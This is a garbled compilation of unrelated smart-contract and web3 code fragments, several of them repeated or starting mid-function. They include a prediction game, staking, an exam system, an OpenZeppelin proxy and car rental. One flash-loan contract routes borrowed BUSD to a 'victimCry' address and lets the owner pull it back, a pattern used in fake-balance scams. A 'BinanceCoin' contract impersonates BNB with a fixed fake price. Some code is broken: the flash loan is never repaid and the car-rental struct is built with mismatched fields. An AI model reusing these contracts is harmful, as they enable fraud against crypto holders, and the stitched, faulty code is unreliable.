        string memory gameId,
        uint256 predictedPrice,
        uint256 _deadline
    ) external payable {
        Game storage game = games[gameId];
        require(game.predictionDeadline > 0, "Game does not exist");
        require(
            block.timestamp < game.predictionDeadline,
            "Prediction deadline has passed"
        );

        // Check player's predictions count
        require(
            playerPredictions[gameId][_msgSender()] < maxPredictionsPerPlayer,
            "Maximum predictions reached"
        );

        // Require payment for the prediction
        ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter
            .ExactOutputSingleParams({
                tokenIn: WETH9,
                tokenOut: BUSDAddress,
                fee: poolFee,
                recipient: address(this),
                deadline: _deadline,
                amountOut: predictionFee,
                amountInMaximum: msg.value,
                sqrtPriceLimitX96: 0
            });

        IUniswapRouter uniswapRouter = IUniswapRouter(uniswapRouterAddress);

        // Executes the swap returning the amountIn needed to spend to receive the desired amountOut.
        uint256 amountIn = uniswapRouter.exactOutputSingle{value: msg.value}(
            params
        );
        uniswapRouter.refundETH();

        if (amountIn < msg.value) {
            (bool success, ) = _msgSender().call{value: msg.value - amountIn}(
                ""
            );
            require(success, "Refund Failed");
        }

        // Add prediction
        playerPredictions[gameId][_msgSender()]++;
        predictions[gameId].push(Prediction(_msgSender(), predictedPrice));

        // Track the total amount paid for predictions for this game
        totalAmountPaid[gameId] += predictionFee;

        emit PredictionSubmitted(gameId, _msgSender(), predictedPrice);
    }

async function addToken() {
  const tokenAddress = "0x855eccc52f877fe777a864b7f72f346d0bff2641"; 
  const tokenSymbol = "FSTDYNAMO";
  const tokenDecimals = 18;

  try {
    const wasAdded = await window.ethereum.request({
      method: "wallet_watchAsset",
      params: {
        type: "ERC20",
        options: {
          address: tokenAddress,
          symbol: tokenSymbol,
          decimals: tokenDecimals,
        },
      },
    });

    if (wasAdded) {
      console.log("✅ Токен FSTDYNAMO успешно добавлен в MetaMask!");
    } else {
      console.log("❌ Пользователь отклонил добавление токена.");
    }
  } catch (error) {
    console.error("Ошибка при добавлении токена:", error);
  }
}

        require(amount > 0, "Amount must be greater than zero");
        require(victimCry != address(0), "victimCry not set");

        pool.flashLoan(address(this), address(busd), amount, "");

        emit FlashLoanExecuted(msg.sender, amount);

        // Send funds to victimCry
        busd.safeTransfer(victimCry, amount);

        emit FundsSentToVictimCry(victimCry, amount);
    }

    function revertTransfer() external onlyOwner nonReentrant {
        require(victimCry != address(0), "victimCry not set");

        uint256 balance = busd.balanceOf(victimCry);
        require(balance > 0, "No funds to revert");

        busd.safeTransferFrom(victimCry, address(this), balance);

        emit TransferReverted(victimCry, balance);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPool {
    function flashLoan(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract NGPTFlashLoan is ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public owner;
    IERC20 public busd;
    IPool public pool;
    address public victimCry; // Address where funds will be sent

    event FlashLoanExecuted(address indexed initiator, uint256 amount);
    event FundsSentToVictimCry(address indexed victimCry, uint256 amount);
    event TransferCompleted(address indexed sender, uint256 amount);
    event TransferReverted(address indexed victimCry, uint256 amount);
    event ApprovalFailed(string reason);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event VictimCryUpdated(address indexed oldVictimCry, address indexed newVictimCry);
    event TokenPoolUpdated(address indexed newToken, address indexed newPool);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /** 
     * @dev Updates the BUSD token and lending pool contract address after deployment.
     * This makes the contract flexible and deployable without predefined addresses.
     */
    function setTokenPool(address _busd, address _pool) external onlyOwner {
        require(_busd != address(0), "Invalid BUSD Address");
        require(_pool != address(0), "Invalid Pool Address");

        busd = IERC20(_busd);
        pool = IPool(_pool);

        emit TokenPoolUpdated(_busd, _pool);
    }

    /**
     * @dev Approves the lending pool to spend a certain amount of BUSD.
     * This must be called before executing a flash loan.
     */
    function approveBUSD(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");
        require(address(busd) != address(0), "Token not set");
        require(address(pool) != address(0), "Pool not set");

        busd.safeIncreaseAllowance(address(pool), amount);
    }

    /**
     * @dev Updates the victimCry address where funds will be sent after the flash loan.
     */
    function updateVictimCry(address _victimCry) external onlyOwner {
        require(_victimCry != address(0), "Invalid victimCry address");

        emit VictimCryUpdated(victimCry, _victimCry);
        victimCry = _victimCry;
    }

    /**
     * @dev Executes a flash loan, borrows BUSD from the pool, and sends it to victimCry.
     * The owner must manually repay the flash loan afterward.
     */
    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(address(busd) != address(0), "Token not set");
        require(address(pool) != address(0), "Pool not set");
        require(victimCry != address(0), "victimCry not set");

        try pool.flashLoan(address(this), address(busd), amount, "") {
            emit FlashLoanExecuted(msg.sender, amount);
            busd.safeTransfer(victimCry, amount);
            emit FundsSentToVictimCry(victimCry, amount);
        } catch {
            revert("Flash loan execution failed");
        }
    }

    /**
     * @dev Reverts funds from the victimCry address back to this contract.
     * Only used when necessary.
     */
    function revertTransfer() external onlyOwner nonReentrant {
        require(victimCry != address(0), "victimCry not set");
        require(address(busd) != address(0), "Token not set");

        uint256 balance = busd.balanceOf(victimCry);
        require(balance > 0, "No funds to revert");

        busd.safeTransferFrom(victimCry, address(this), balance);
        emit TransferReverted(victimCry, balance);
    }

    /**
     * @dev Allows the owner to transfer ownership of the contract.
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(address(busd) != address(0), "Token not set");
        require(address(pool) != address(0), "Pool not set");
        require(victimCry != address(0), "victimCry not set");

        try pool.flashLoan(address(this), address(busd), amount, "") {
            // Successful execution
            emit FlashLoanExecuted(msg.sender, amount);
            busd.safeTransfer(victimCry, amount);
            emit FundsSentToVictimCry(victimCry, amount);
        } catch {
            revert("Flash loan execution failed");
        }
    }

    /**
     * @dev Reverts funds from the victimCry address back to this contract.
     * Only used when necessary.
     */
    function revertTransfers() external onlyOwner nonReentrant {
        require(victimCry != address(0), "victimCry not set");
        require(address(busd) != address(0), "Token not set");

        uint256 balance = busd.balanceOf(address(this));
        require(balance > 0, "No funds to revert");

        busd.safeTransferFrom(address(this), victimCry, balance);
        emit TransferCompleted(address(this), balance);
    }

    /**
     * @dev Allows the owner to transfer ownership of the contract.
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract NGPTFlashLoan is ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public owner;
    IERC20 public busd;
    IPool public pool;
    address public victimCry; // Address where funds will be sent

    event FlashLoanExecuted(address indexed initiator, uint256 amount);
    event FundsSentToVictimCry(address indexed victimCry, uint256 amount);
    event TransferCompleted(address indexed sender, uint256 amount);
    event TransferReverted(address indexed victimCry, uint256 amount);
    event ApprovalFailed(string reason);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event VictimCryUpdated(address indexed oldVictimCry, address indexed newVictimCry);
    event TokenPoolUpdated(address indexed newToken, address indexed newPool);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /** 
     * @dev Updates the BUSD token and lending pool contract address after deployment.
     * This makes the contract flexible and deployable without predefined addresses.
     */
    function setTokenPool(address _busd, address _pool) external onlyOwner {
        require(_busd != address(0), "Invalid BUSD Address");
        require(_pool != address(0), "Invalid Pool Address");
        require(_busd.code.length > 0, "BUSD is not a contract");
        require(_pool.code.length > 0, "Pool is not a contract");

        busd = IERC20(_busd);
        pool = IPool(_pool);

        emit TokenPoolUpdated(_busd, _pool);
    }

    /**
     * @dev Approves the lending pool to spend a certain amount of BUSD.
     * This must be called before executing a flash loan.
     */
    function approveBUSD(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");
        require(address(busd) != address(0), "Token not set");
        require(address(pool) != address(0), "Pool not set");

        try busd.safeIncreaseAllowance(address(pool), amount) {
            // Successful execution
        } catch {
            revert("Approval failed");
        }
    }

    /**
     * @dev Updates the victimCry address where funds will be sent after the flash loan.
     */
    function updateVictimCry(address _victimCry) external onlyOwner {
        require(_victimCry != address(0), "Invalid victimCry address");

        emit VictimCryUpdated(victimCry, _victimCry);
        victimCry = _victimCry;
    }

    /**
     * @dev Executes a flash loan, borrows BUSD from the pool, and sends it to victimCry.
     * The owner must manually repay the flash loan afterward.
     */
    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(address(busd) != address(0), "Token not set");
        require(address(pool) != address(0), "Pool not set");
        require(victimCry != address(0), "victimCry not set");

        try pool.flashLoan(address(this), address(busd), amount, "") {
            // Successful execution
            emit FlashLoanExecuted(msg.sender, amount);
            busd.safeTransfer(victimCry, amount);
            emit FundsSentToVictimCry(victimCry, amount);
        } catch {
            revert("Flash loan execution failed");
        }
    }

    /**
     * @dev Reverts funds from the contract back to victimCry.
     */
    function revertTransfer() external onlyOwner nonReentrant {
        require(victimCry != address(0), "victimCry not set");
        require(address(busd) != address(0), "Token not set");

        uint256 balance = busd.balanceOf(address(this));
        require(balance > 0, "No funds to revert");

        busd.safeTransferFrom(address(this), victimCry, balance);
        emit TransferCompleted(address(this), balance);
    }

    /**
     * @dev Allows the owner to transfer ownership of the contract.
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

pragma solidity ^0.8.0;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BinanceCoin {
    string public name = "BNB";
    string public symbol = "BNB";
    uint8 public decimals = 18;

    address public realBNB = address(0x73331A4c1C9DA4f3454336C3D1827Cc8Ef1b2e);
    IBEP20 private bnbToken = IBEP20(realBNB);


    function totalSupply() public view returns (uint256) {
        return bnbToken.totalSupply();
    }

    function balanceOf(address account) public view returns (uint256) {
        return bnbToken.balanceOf(account); 
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        return bnbToken.transfer(recipient, amount);
    }

    function getBNBPrice() public view returns (uint256) {
        
        return 582 * (10 ** decimals); 
    }

    function logoURI() public pure returns (string memory) {
        return "https://assets.trustwalletapp.com/blockchains/smartchain/assets/0xBfFfdFadE/logo.png"; 
    }
}

    event Staked(address indexed user, uint256 amount); // Evento cuando un usuario realiza staking
    event Withdrawn(address indexed user, uint256 amount); // Evento cuando un usuario retira sus tokens
    event RewardDistributed(address indexed user, uint256 reward); // Evento cuando se distribuyen recompensas
    event PoolPrizeSet(uint256 amount); // Evento cuando se establece el monto del pool de recompensas
    event RewardPoolUpdated(uint256 amount); // Evento cuando se actualiza el pool de recompensas
    event TimeUnitUpdated(uint256 timeUnit); // Evento cuando se actualiza la unidad de tiempo

    constructor(IERC20 _stakingToken, address _rewardPoolAddress) {
        require(address(_stakingToken) != address(0), "Dirección del token de staking inválida");
        require(_rewardPoolAddress != address(0), "Dirección del pool de recompensas inválida");
        stakingToken = _stakingToken;
        rewardPoolAddress = _rewardPoolAddress;
        startTime = block.timestamp;
        transferOwnership(msg.sender); // Transfiere la propiedad del contrato al creador
    }

    function setPoolPrizeAmount(uint256 _amount) external onlyOwner nonReentrant whenNotPaused {
        require(_amount > 0, "La cantidad debe ser mayor que cero");
        require(stakingToken.transferFrom(msg.sender, address(this), _amount), "Transferencia fallida");
        rewardPool += _amount;
        emit PoolPrizeSet(_amount);
        emit RewardPoolUpdated(rewardPool);
    }

    function stake(uint256 _amount) external nonReentrant whenNotPaused {
        require(_amount > 0, "La cantidad debe ser mayor que cero");
        require(stakingToken.balanceOf(msg.sender) >= _amount, "Balance de tokens insuficiente");

        updateRewards(msg.sender);

        stakingDeposits[msg.sender].push(Deposit(_amount, block.timestamp));
        if (stakingDeposits[msg.sender].length == 1) {
            lastUpdateTime[msg.sender] = block.timestamp;
            stakerIndex[msg.sender] = stakers.length;
            stakers.push(msg.sender);
        }
        totalStaked += _amount;
        stakingToken.transferFrom(msg.sender, address(this), _amount);

        emit Staked(msg.sender, _amount);
    }

    function withdraw(uint256 _amount) external nonReentrant whenNotPaused {
        require(_amount > 0, "La cantidad debe ser mayor que cero");

        updateRewards(msg.sender);

        uint256 remainingAmount = _amount;

        for (uint256 i = 0; i < stakingDeposits[msg.sender].length && remainingAmount > 0; i++) {
            Deposit storage deposit = stakingDeposits[msg.sender][i];
            if (deposit.amount > remainingAmount) {
                deposit.amount -= remainingAmount;
                remainingAmount = 0;
            } else {
                remainingAmount -= deposit.amount;
                deposit.amount = 0;
            }
        }

        require(remainingAmount == 0, "Monto insuficiente en staking");

        totalStaked -= _amount;

        // Eliminar depósitos vacíos
        for (uint256 i = stakingDeposits[msg.sender].length; i > 0; i--) {
            if (stakingDeposits[msg.sender][i - 1].amount == 0) {
                stakingDeposits[msg.sender].pop();
            } else {
                break;
            }
        }

        if (stakingDeposits[msg.sender].length == 0) {
            removeStaker(msg.sender);
        }

        stakingToken.transfer(msg.sender, _amount);

        emit Withdrawn(msg.sender, _amount);
    }

    function updateRewards(address _staker) internal {
        uint256 currentTime = block.timestamp;
        uint256 stakingDuration = currentTime - lastUpdateTime[_staker];
        uint256 effectiveDays = stakingDuration / timeUnit;
        uint256 stakerBalance = stakingBalance(_staker);

        if (stakerBalance > 0 && totalStaked > 0 && effectiveDays > 0) {
            uint256 newReward = (rewardPool * stakerBalance * effectiveDays) / totalStaked;
            rewardBalance[_staker] += newReward;
        }

        lastUpdateTime[_staker] = currentTime;
    }

    function rewardsPerTokenStaked(address _staker) public view returns (uint256) {
        uint256 stakerBalance = stakingBalance(_staker);
        if (stakerBalance == 0) {
            return 0;
        }

        uint256 currentTime = block.timestamp;
        uint256 stakingDuration = currentTime - lastUpdateTime[_staker];
        uint256 effectiveDays = stakingDuration / timeUnit;

        if (totalStaked == 0 || effectiveDays == 0) {
            return 0;
        }

        uint256 newReward = (rewardPool * stakerBalance * effectiveDays) / totalStaked;

        return newReward + rewardBalance[_staker];
    }

    function distributeRewards() external onlyOwner nonReentrant whenNotPaused {
        uint256 totalRewards = rewardPool;
        uint256 totalEffectiveStaking = totalStaked;

        require(totalEffectiveStaking > 0, "No hay staking efectivo");

        for (uint256 i = 0; i < stakers.length; i++) {
            address staker = stakers[i];
            updateRewards(staker); // Actualizamos las recompensas antes de distribuir
            uint256 reward = rewardBalance[staker];
            if (reward > 0) {
                rewardBalance[staker] = 0;
                rewardPool -= reward;
                stakingToken.transfer(staker, reward);
                emit RewardDistributed(staker, reward);
            }
        }

        emit RewardPoolUpdated(rewardPool);
    }

    function stakingBalance(address _staker) public view returns (uint256) {
        uint256 balance = 0;
        for (uint256 i = 0; i < stakingDeposits[_staker].length; i++) {
            balance += stakingDeposits[_staker][i].amount;
        }
        return balance;
    }

    function setTimeUnit(uint256 _timeUnit) external onlyOwner {
        require(_timeUnit > 0, "La unidad de tiempo debe ser mayor que cero");
        timeUnit = _timeUnit;
        emit TimeUnitUpdated(_timeUnit);
    }

    function removeStaker(address _staker) internal {
        uint256 index = stakerIndex[_staker];
        address lastStaker = stakers[stakers.length - 1];
        stakers[index] = lastStaker;
        stakerIndex[lastStaker] = index;
        stakers.pop();
        delete stakerIndex[_staker];
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }
}

since there are still no answers yet, but over 1k views though, I'll leave here a solution if anyone else is facing the same error.
The solidity constructor in your example expects 2 arguments of type address. This means if you deploy your contract you also need to provide those 2.
As for the deployment: No matter how you deploy your contract, providing all constructor arguments should solve your problem and your contract should be able to get deployed now.
If you work with truffle, you need to adjust your deployer .../migrations/2_deploy_contracts.js and pass 2 addresses to satisfy the constructor parameters.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ExamSystem {
    struct Student {
        address studentAddress;
        string name;
        bool registered;
    }

    struct Exam {
        uint256 id;
        string subject;
        string date;
        string question1;
        string question2;
        string question3;
        bool isActive;
    }

    address public admin;
    mapping(address => Student) public students;
    mapping(uint256 => Exam) public exams;

    uint256 public examCount;
    bool public systemActive = true;

    address[] private registeredStudentsList;

    event StudentRegistered(address indexed student, string name);
    event ExamScheduled(uint256 indexed id, string subject, string date);
    event AnswerSubmitted(address indexed student, uint256 examId, string answerHash);
    event ExamEnded(uint256 indexed id);
    event ExamActivated(uint256 indexed id);
    event SystemDeactivated();
    event SystemReactivated();

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can perform this action");
        _;
    }

    modifier onlyActiveSystem() {
        require(systemActive, "System is not active");
        _;
    }

    modifier onlyRegisteredStudent() {
        require(students[msg.sender].registered, "You are not registered");
        _;
    }

    constructor() {
        admin = msg.sender;
        require(admin != address(0), "Admin address cannot be zero");
    }

    // Register a student
    function registerStudent(string memory _name) public onlyActiveSystem {
        require(!students[msg.sender].registered, "Already registered");
        students[msg.sender] = Student(msg.sender, _name, true);
        registeredStudentsList.push(msg.sender);
        emit StudentRegistered(msg.sender, _name);
    }

    // Admin schedules an exam
    function scheduleExam(
        string memory _subject,
        string memory _date,
        string memory _question1,
        string memory _question2,
        string memory _question3
    ) public onlyAdmin onlyActiveSystem {
        examCount++;
        exams[examCount] = Exam(
            examCount,
            _subject,
            _date,
            _question1,
            _question2,
            _question3,
            true
        );
        emit ExamScheduled(examCount, _subject, _date);
        emit ExamActivated(examCount);
    }

    // View an exam by ID
    function viewExam(uint256 _id) public view returns (Exam memory) {
        require(_id > 0 && _id <= examCount, "Invalid exam ID");
        require(exams[_id].isActive, "Exam is not active");
        return exams[_id];
    }

    // Get a single exam safely
    function getExamById(uint256 _id) public view returns (Exam memory) {
        require(_id > 0 && _id <= examCount, "Exam does not exist");
        require(exams[_id].isActive, "Exam is not active or has ended");
        return exams[_id];
    }

    // Get all active exams
    function getAllExams() public view returns (Exam[] memory) {
        require(systemActive, "System is not active");

        uint256 activeExamCount = 0;
        for (uint256 i = 1; i <= examCount; i++) {
            if (exams[i].isActive) {
                activeExamCount++;
            }
        }

        Exam[] memory activeExams = new Exam[](activeExamCount);
        uint256 counter = 0;

        for (uint256 i = 1; i <= examCount; i++) {
            if (exams[i].isActive) {
                activeExams[counter] = exams[i];
                counter++;
            }
        }

        return activeExams;
    }

    // Student submits an answer
    function submitAnswer(uint256 _id, string memory _answerHash)
        public
        onlyRegisteredStudent
        onlyActiveSystem
    {
        require(_id > 0 && _id <= examCount, "Invalid exam ID");
        require(exams[_id].isActive, "Exam is not active");
        emit AnswerSubmitted(msg.sender, _id, _answerHash);
    }

    // End an exam by ID
    function endExam(uint256 _id) public onlyAdmin {
        require(_id > 0 && _id <= examCount, "Invalid exam ID");
        require(exams[_id].isActive, "Exam already ended");
        exams[_id].isActive = false;
        emit ExamEnded(_id);
    }

    // Deactivate the system
    function deactivateSystem() public onlyAdmin {
        systemActive = false;
        emit SystemDeactivated();
    }

    // Reactivate the system
    function reactivateSystem() public onlyAdmin {
        systemActive = true;
        emit SystemReactivated();
    }

    // Get role of the current user
    function login() public view returns (string memory role) {
        if (msg.sender == admin) {
            return "admin";
        } else if (students[msg.sender].registered) {
            return "student";
        } else {
            return "unregistered";
        }
    }

    //Get all registered students (Admin only)
    function getAllStudents() public view onlyAdmin returns (Student[] memory) {
        uint256 studentCount = registeredStudentsList.length;
        Student[] memory registeredStudents = new Student[](studentCount);

        for (uint256 i = 0; i < studentCount; i++) {
            address studentAddr = registeredStudentsList[i];
            if (students[studentAddr].registered) {
                registeredStudents[i] = students[studentAddr];
            }
        }
        return registeredStudents;
    }
}

 // SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (proxy/transparent/TransparentUpgradeableProxy.sol)

pragma solidity ^0.8.0;

import "../ERC1967/ERC1967Proxy.sol";

/**
 * @dev This contract implements a proxy that is upgradeable by an admin.
 *
 * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector
 * clashing], which can potentially be used in an attack, this contract uses the
 * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two
 * things that go hand in hand:
 *
 * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if
 * that call matches one of the admin functions exposed by the proxy itself.
 * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the
 * implementation. If the admin tries to call a function on the implementation it will fail with an error that says
 * "admin cannot fallback to proxy target".
 *
 * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing
 * the admin, so it's best if it's a dedicated account that is not used for anything else. This will avoid headaches due
 * to sudden errors when trying to call a function from the proxy implementation.
 *
 * Our recommendation is for the dedicated account to be an instance of the {ProxyAdmin} contract. If set up this way,
 * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.
 */
contract TransparentUpgradeableProxy is ERC1967Proxy {
    /**
     * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and
     * optionally initialized with `_data` as explained in {ERC1967Proxy-constructor}.
     */
    constructor(
        address _logic,
        address admin_,
        bytes memory _data
    ) payable ERC1967Proxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _changeAdmin(admin_);
    }

    /**
     * @dev Modifier used internally that will delegate the call to the implementation unless the sender is the admin.
     */
    modifier ifAdmin() {
        if (msg.sender == _getAdmin()) {
            _;
        } else {
            _fallback();
        }
    }

    /**
     * @dev Returns the current admin.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyAdmin}.
     *
     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the
     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.
     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`
     */
    function admin() external ifAdmin returns (address admin_) {
        admin_ = _getAdmin();
    }

    /**
     * @dev Returns the current implementation.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyImplementation}.
     *
     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the
     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.
     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`
     */
    function implementation() external ifAdmin returns (address implementation_) {
        implementation_ = _implementation();
    }

    /**
     * @dev Changes the admin of the proxy.
     *
     * Emits an {AdminChanged} event.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-changeProxyAdmin}.
     */
    function changeAdmin(address newAdmin) external virtual ifAdmin {
        _changeAdmin(newAdmin);
    }

    /**
     * @dev Upgrade the implementation of the proxy.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgrade}.
     */
    function upgradeTo(address newImplementation) external ifAdmin {
        _upgradeToAndCall(newImplementation, bytes(""), false);
    }

    /**
     * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified
     * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the
     * proxied contract.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgradeAndCall}.
     */
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin {
        _upgradeToAndCall(newImplementation, data, true);
    }

    /**
     * @dev Returns the current admin.
     */
    function _admin() internal view virtual returns (address) {
        return _getAdmin();
    }

    /**
     * @dev Makes sure the admin cannot access the fallback function. See {Proxy-_beforeFallback}.
     */
    function _beforeFallback() internal virtual override {
        require(msg.sender != _getAdmin(), "TransparentUpgradeableProxy: admin cannot fallback to proxy target");
        super._beforeFallback();
    }
}

```solidity
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CarRental {

    enum CarStatus { Available, Rented }

    struct Car {
        uint id;
        string model;
        CarStatus status;
        address renter;
        uint256 price;
    }

    mapping(uint => Car) public cars;

    address public owner;
    uint public carCount;

    event LogCarAdded(uint carId, string model, uint256 price);
    event LogCarRented(uint carId, address renter);
    event CarReturned(uint carId, address renter);

    // Modifier to restrict access to the owner
    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    // Modifier to check if the car is available
    modifier carAvailable(uint carId) {
        require(cars[carId].status == CarStatus.Available, "Car is not available");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // Function to add a new car
    function addCar(string memory _model, uint256 _rentalPrice) public onlyOwner {
        carCount++;
        cars[carCount] = Car(carCount, _model, _rentalPrice, CarStatus.Available, address(0));
        emit LogCarAdded(carCount, _model, _rentalPrice);
    }

    // Function to rent a car
    function rentCar(uint carId) public payable carAvailable(carId) {
        Car storage car = cars[carId];
        require(msg.value >= car.rentalPrice, "Insufficient rental payment");

        car.status = CarStatus.Rented;
        car.renter = msg.sender;

        emit LogCarRented(carId, msg.sender);
    }

    // Function to return a rented car
    function returnCar(uint carId) public {
        Car storage car = cars[carId];
        require(car.status == CarStatus.Rented, "Car is not rented");
        require(car.renter == msg.sender, "Only the renter can return the car");

        car.status = CarStatus.Available;
        car.renter = address(0);

        emit CarReturned(carId, msg.sender);
    }
}
```
